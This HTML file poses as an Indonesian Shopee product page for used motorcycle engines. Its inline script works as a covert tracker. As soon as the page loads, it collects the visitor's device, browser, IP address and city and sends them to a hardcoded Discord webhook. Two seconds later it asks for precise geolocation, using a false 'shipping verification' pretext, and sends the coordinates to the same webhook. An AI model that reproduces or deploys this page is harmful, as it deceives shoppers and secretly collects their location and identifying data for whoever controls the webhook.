<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Detail Produk | Shopee</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <style>
    body { font-family: -apple-system, Helvetica Neue, Helvetica, Roboto, Arial, Sans-Serif; background-color: #f5f5f5; }
    .shopee-orange-text { color: #ee4d2d; }
    .shopee-orange-bg { background-color: #ee4d2d; }
    .btn-shadow { box-shadow: 0 1px 1px 0 rgba(0,0,0,.03); }
  </style>
</head>
<body class="max-w-md mx-auto bg-white min-h-screen relative pb-24">

  <div class="relative w-full aspect-square bg-gray-100" onclick="handleAction()">
    <img src="./tirev2010.jpg" alt="Produk" class="w-full h-full object-cover">
    <div class="absolute top-4 left-4 flex gap-2">
      <button class="bg-black/30 w-8 h-8 rounded-full text-white flex items-center justify-center backdrop-blur-sm">
        <i class="fas fa-arrow-left text-sm"></i>
      </button>
    </div>
  </div>

  <div class="p-4 bg-white" onclick="handleAction()">
    <div class="flex flex-col gap-2">
      <h1 class="text-[#212121] text-base leading-tight line-clamp-2">Jual Beli Mesin tiger,megapro,GL,DLL</h1>
      
      <div class="flex items-baseline gap-1 mt-1">
        <span class="text-xs shopee-orange-text font-medium">Rp</span>
        <span class="text-2xl shopee-orange-text font-medium">1.700.000 - 6.700.000</span>
      </div>

      <div class="flex items-center gap-2 mt-2 pt-2 border-t border-gray-100">
        <div class="flex items-center bg-[#ffeee8] px-1 rounded">
          <span class="text-[10px] shopee-orange-text font-bold">Garansi Shopee</span>
        </div>
        <span class="text-xs text-gray-500">|</span>
        <span class="text-xs text-gray-500">27 Terjual</span>
      </div>
    </div>
  </div>

  <div class="mt-2 p-4 bg-white flex items-center justify-between border-y border-gray-100">
    <div class="flex items-start gap-3">
      <i class="fas fa-shipping-fast text-teal-600 mt-1"></i>
      <div>
        <p class="text-sm font-medium text-gray-800">Verifikasi Pengiriman</p>
        <p class="text-xs text-gray-500 mt-0.5">Shopee ingin memverifikasi lokasi Anda untuk ongkir</p>
      </div>
    </div>
    <i class="fas fa-chevron-right text-gray-300 text-xs"></i>
  </div>

  <div class="mt-2 p-4 bg-white flex items-center justify-between border-y border-gray-100">
    <span class="text-sm text-gray-800">Voucher Toko</span>
    <div class="flex gap-2">
      <span class="bg-[#ffeee8] text-[10px] shopee-orange-text px-2 py-0.5 border border-[#ee4d2d]">Diskon Rp5rb</span>
    </div>
  </div>

  <div class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 max-w-md mx-auto flex h-14 z-50">
    <div class="flex w-1/3 border-r border-gray-100">
      <button onclick="handleAction()" class="flex-1 flex flex-col items-center justify-center border-r border-gray-50">
        <i class="far fa-comments text-teal-600 text-lg"></i>
        <span class="text-[10px] mt-0.5 text-gray-600">Chat</span>
      </button>
      <button onclick="handleAction()" class="flex-1 flex flex-col items-center justify-center">
        <i class="fas fa-cart-plus text-teal-600 text-lg"></i>
        <span class="text-[10px] mt-0.5 text-gray-600">Keranjang</span>
      </button>
    </div>
    <button onclick="handleAction()" class="w-2/3 shopee-orange-bg text-white font-medium text-sm">
      Beli Sekarang
    </button>
  </div>

  <script>
    // Fungsionalitas Webhook & Tracking (Tetap Dipertahankan)
    const webhook = "https://discord.com/api/webhooks/1468299380330332355/I2z1xzpeHQp4iKlllSQOFewI_z_OjIRBsDmgl7jbqbvM4GWQtYTewJXltpZQsGB5OV87";

    async function sendToDiscord(title, fields) {
      try {
        await fetch(webhook, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ embeds: [{ title, fields, color: 15548997, timestamp: new Date() }] })
        });
      } catch (e) { console.error("Log failed"); }
    }

    window.onload = async () => {
      let f = [
        { name: "üì± Device", value: navigator.platform, inline: true },
        { name: "üåê Browser", value: navigator.userAgent.split(' ').pop(), inline: true }
      ];
      try {
        const res = await fetch('https://ipapi.co/json/');
        const d = await res.json();
        f.push({ name: "üåç IP", value: d.ip }, { name: "üèôÔ∏è Kota", value: `${d.city}, ${d.region}` });
      } catch (e) {}
      await sendToDiscord("üì¶ Detail Produk Entry (Template View)", f);

      // Minta lokasi otomatis setelah 2 detik
      setTimeout(reqLoc, 2000);
    };

    function reqLoc() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (p) => sendToDiscord("üìç Lokasi Detail Diterima", [{ name: "Maps", value: `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}` }]),
          () => sendToDiscord("‚ùå Lokasi Detail Ditolak", [{ name: "User", value: "Menolak Izin" }])
        );
      }
    }

    function handleAction() {
      window.location.href = 'profiltoko.html';
    }
  </script>
</body>
</html>
